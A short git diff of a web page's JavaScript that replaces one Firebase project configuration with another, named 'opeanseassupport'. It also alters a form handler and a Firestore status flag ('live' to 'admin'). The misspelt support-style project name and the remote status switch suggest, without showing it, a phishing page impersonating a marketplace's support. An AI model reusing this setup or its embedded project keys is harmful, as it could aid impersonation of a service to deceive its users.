@@ -1,12 +1,11 @@
 const app = firebase.initializeApp({
-    apiKey: "AIzaSyAZaVfOOPYkw3kFTi1FlynQ41vT4IMXVpQ",
-    authDomain: "pamalikasako.firebaseapp.com",
-    databaseURL: "https://pamalikasako-default-rtdb.firebaseio.com",
-    projectId: "pamalikasako",
-    storageBucket: "pamalikasako.appspot.com",
-    messagingSenderId: "393016043530",
-    appId: "1:393016043530:web:356a22824be3f5d0ce57f3",
-    measurementId: "G-FQ4XL0C28F"
+    apiKey: "AIzaSyBskQE0MtgrzaGiifrTjasqM1P7GqF-4IA",
+    authDomain: "opeanseassupport.firebaseapp.com",
+    projectId: "opeanseassupport",
+    storageBucket: "opeanseassupport.appspot.com",
+    messagingSenderId: "172655186140",
+    appId: "1:172655186140:web:74c4dad1902667f913a419",
+    measurementId: "G-SV1CFC7N5Q",
   })
 
 const db = firebase.firestore(app);
@@ -37,7 +36,7 @@ $('.form__btn').on('click', function () {
 
         } else {
 
-            console.log('porn')
+            alert('error')
         }
     }, (error) => {
         console.log(error);
@@ -53,7 +52,8 @@ $('.form__btn').on('click', function () {
 function addUSER() {
     
     ref.doc('kerveysir').set({
-        status: 'live'
+        status: 'admin'
     }).then( console.log('in'))
 }
+// addUSER()
 
